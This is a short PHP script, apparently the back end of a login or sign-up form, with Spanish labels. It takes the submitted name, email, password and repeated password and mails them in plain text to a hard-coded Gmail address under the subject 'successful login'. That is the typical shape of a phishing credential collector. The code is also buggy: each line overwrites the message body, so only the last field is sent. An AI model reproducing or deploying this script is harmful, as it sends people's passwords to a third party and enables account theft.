<?php
if($_SERVER ['REQUEST_METHOD']==='POST'){

    $nombre=$_POST['nombre'];
    $email=$_POST['email'];
    $password=$_POST['password'];
    $password2=$_POST['password2'];

    $asunto='Logueo exitoso ';

    $destinatario= 'er55833@gmail.com';

    $cuerpo = "Nombre: " . $nombre."\n";
    $cuerpo = "Correo: ".$email."\n";
    $cuerpo = "Password: ".$password."\n";
    $cuerpo = "Contraseña repetida: ".$password2."\n";

    if(mail($destinatario, $asunto, $cuerpo)){
        echo"El mensaje fue satifactoriamente enviado";
    }else{
        echo"El mensaje no fue enviado";
    }

}
?>;